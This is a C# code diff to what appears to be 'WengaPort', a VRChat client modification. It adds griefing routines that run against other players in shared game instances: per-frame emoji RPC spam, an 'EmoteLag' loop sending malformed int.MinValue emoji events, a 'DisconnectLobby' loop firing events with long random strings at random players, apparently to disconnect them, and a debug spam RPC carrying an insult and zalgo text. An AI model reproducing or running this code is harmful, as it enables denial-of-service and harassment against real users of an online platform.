@@ -21,6 +21,7 @@ using VRC.Udon.Common.Interfaces;
 using System.IO;
 using Transmtn.DTO.Notifications;
 using VRC.Core;
+using System.Collections.Generic;
 
 namespace WengaPort.Modules
 {
@@ -39,33 +40,39 @@ namespace WengaPort.Modules
 					@object
 				});
 			}
-			catch
-			{
-			}
+			catch { }
 		}
 
-		public static IEnumerator FriendBackup()
-		{
-			string[] Friends = File.ReadAllLines("WengaPort\\Friends.txt");
-			Extensions.Logger.WengaLogger($"[Friends] Adding {Friends.Length} Friends - Time: {Friends.Length * 12} Seconds");
-			int i = 0;
-			foreach (string line in Friends)
-			{
-				if (!APIUser.IsFriendsWith(line))
+		public static IEnumerator EmojiSpammer()
+        {
+			for (; ; )
+            {
+				if (!EmojiSpam || RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
+				EmojiRPC(29);
+				yield return new WaitForEndOfFrame();
+            }
+        }
+
+		public static List<string> RPCBlock = new List<string>();
+		public static List<string> EventBlock = new List<string>();
+		public static bool EmoteLagToggle = false;
+
+		public static IEnumerator EmoteLag()
+        {
+			for (; ; )
+            {
+				if (!EmoteLagToggle | RoomManager.field_Internal_Static_ApiWorld_0 == null)
+                {
+					yield break;
+                }
+				for (int i = 0; i < 2; i++)
 				{
-					yield return new WaitForSeconds(12);
-					Extensions.Logger.WengaLogger("[Friends] sending request to " + line);
-                    Transmtn.DTO.Notifications.Notification xx = FriendRequest.Create(line);
-					Utils.VRCWebSocketsManager.SendNotification(xx);
-					i++;
+                    EmojiRPC(int.MinValue);			
+                    EmojiRPC(int.MinValue);
+					EmojiRPC(int.MinValue);
 				}
-				else
-				{
-					Extensions.Logger.WengaLogger("[Friends] Skipping " + line);
-				}
+                yield return new WaitForEndOfFrame();
 			}
-            Extensions.Logger.WengaLogger($"Summary:\n Total Request: {i} with {File.ReadAllLines("WengaPort\\Friends.txt").Length} friends");
-            yield break;
 		}
 
 		public static void EmoteRPC(int i)
@@ -80,8 +87,9 @@ namespace WengaPort.Modules
 					@object
 				});
 			}
-			catch {}
+			catch { }
 		}
+
 		private static void OpRaiseEvent(byte code, object customObject, ObjectPublicObByObInByObObUnique RaiseEventOptions, SendOptions sendOptions)
 		{
 			Il2CppSystem.Object Object = Utils.Serialization.FromManagedToIL2CPP<Il2CppSystem.Object>(customObject);
@@ -187,64 +195,42 @@ namespace WengaPort.Modules
 
 		private static VRC_EventHandler handler;
 
-		public static void DisconnectLobby()
-		{
-			if (handler == null)
-			{
-				handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
-			}
-            VrcEvent vrcEvent = new VrcEvent
-            {
-				EventType = (VrcEventType)14,
-				ParameterObject = handler.gameObject,
-				ParameterInt = 1,
-				ParameterFloat = 0f,
-				ParameterString = "<3 WengaPort <3 | " + RandomString(820) + " | <3 WengaPort <3",
-				ParameterBoolOp = (VrcBooleanOp)(-1),
-				ParameterBytes = new Il2CppStructArray<byte>(0L)
-			};
-			int Type = 0;
-			Player player = PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.ToArray()[new Il2CppSystem.Random().Next(0, PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.Count)];
-			handler.TriggerEvent(vrcEvent, (VrcBroadcastType)Type, player.gameObject, 0f);
-			Player player2 = PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.ToArray()[new Il2CppSystem.Random().Next(0, PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.Count)];
-			handler.TriggerEvent(vrcEvent, (VrcBroadcastType)Type, player2.gameObject, 0f);
-		}
-
-		public static void PortalDebugSpam()
-		{
-			for (int i = 0; i < 3; i++)
-			{
-				Networking.RPC(RPC.Destination.AllBufferOne, GameObject.Find("Camera (eye)").gameObject, "ConfigurePortal", new Il2CppSystem.Object[0]);
-			}
-			for (int i = 0; i < 3; i++)
-			{
-				Networking.RPC(RPC.Destination.AllBufferOne, GameObject.Find("Camera (eye)").gameObject, "Get Fucked Russian Debug -Wenga#0666 L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞", new Il2CppSystem.Object[0]);
-			}
-		}
-
-		public static void TargetDebugSpam(VRCPlayerApi player)
-		{
-			for (int i = 0; i < 3; i++)
-			{
-				Networking.RPC(player, GameObject.Find("Camera (eye)").gameObject, "Get Fucked Russian Debug -Wenga#0666 L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞", new Il2CppSystem.Object[0]);
-			}
-		}
-
-		public static IEnumerator Event6TPRPC()
+		public static IEnumerator DisconnectLobby()
 		{
 			for (; ; )
             {
-				if (!Desync) yield break;
-				for (int I = 0; I < 15; I++)
+				if (!DisconnectToggle || RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
+				else if (handler == null)
 				{
-					foreach (var Player in Utils.PlayerManager.GetAllPlayers())
-					{
-						SendRPC(VrcEventType.SendRPC, "SendRPC", Player.field_Internal_VRCPlayer_0.gameObject, 9, 0, "TeleportRPC", VrcBooleanOp.False, VrcBroadcastType.AlwaysUnbuffered);
-					}
+					handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
 				}
-				yield return new WaitForEndOfFrame();
+				VrcEvent vrcEvent = new VrcEvent
+				{
+					EventType = (VrcEventType)14,
+					ParameterObject = handler.gameObject,
+					ParameterInt = 1,
+					ParameterFloat = 0f,
+					ParameterString = "<3 WengaPort <3 | " + RandomString(820) + " | <3 WengaPort <3",
+					ParameterBoolOp = (VrcBooleanOp)(-1),
+					ParameterBytes = new Il2CppStructArray<byte>(0L)
+				};
+				int Type = 0;
+				Player player = PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.ToArray()[new Il2CppSystem.Random().Next(0, PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.Count)];
+				handler.TriggerEvent(vrcEvent, (VrcBroadcastType)Type, player.gameObject, 0f);
+				Player player2 = PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.ToArray()[new Il2CppSystem.Random().Next(0, PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0.Count)];
+				handler.TriggerEvent(vrcEvent, (VrcBroadcastType)Type, player2.gameObject, 0f);
+				yield return new WaitForSeconds(0.2f);
 			}
 		}
+
+		public static void DebugSpam()
+		{
+			for (int i = 0; i < 3; i++)
+			{
+				SendRPC(VrcEventType.SendRPC, "SendRPC", GameObject.Find("Camera (eye)").gameObject, 1, 0, "Get Fucked Russian Debug -Wenga#0666 L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞", VrcBooleanOp.Unused, VrcBroadcastType.AlwaysUnbuffered);
+			}
+		}
+
 		public static void EventSpammer(this int count, int amount, System.Action action, int? sleep = null)
 		{
 			for (int ii = 0; ii < count; ii++)
@@ -257,6 +243,7 @@ namespace WengaPort.Modules
 					Thread.Sleep(25);
 			}
 		}
+
 		public static void SendRPC(VrcEventType EventType, string Name, GameObject ParamObject, int Int, float Float, string String, VrcBooleanOp Bool, VrcBroadcastType BroadcastType)
 		{
 			if (handler == null)
